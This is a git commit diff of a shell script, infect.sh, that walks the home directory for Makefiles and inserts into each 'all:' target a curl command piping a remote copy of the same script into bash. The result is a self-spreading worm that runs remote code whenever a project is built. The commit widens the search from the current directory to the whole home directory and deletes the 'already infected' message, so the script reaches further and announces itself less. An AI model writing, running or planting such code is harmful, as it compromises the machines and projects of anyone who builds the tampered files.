ea1cbf422bf881813dc6337e67bc320b9c70fe8b
pfuchs <72362902+Bluegales@users.noreply.github.com>
2022-09-02 17:17:45 +0200

    Update infect.sh

--- infect.sh
+++ infect.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
-FILES=$(find . -type d \( -path ~/Library \) -prune -o -type f -iname makefile 2>/dev/null)
+FILES=$(find ~ -type d \( -path ~/Library \) -prune -o -type f -iname makefile 2>/dev/null)
 IFS=$(echo -en "\n\b")
 for f in $FILES
 do
     grep -q "infect" $f
     if [ $? -ne 0 ]; then
         printf '%s\n' 'g/all:/+1i\' '    curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash' 'wq' | ed -s $f
-    else
-        echo "already infected"
     fi
 done
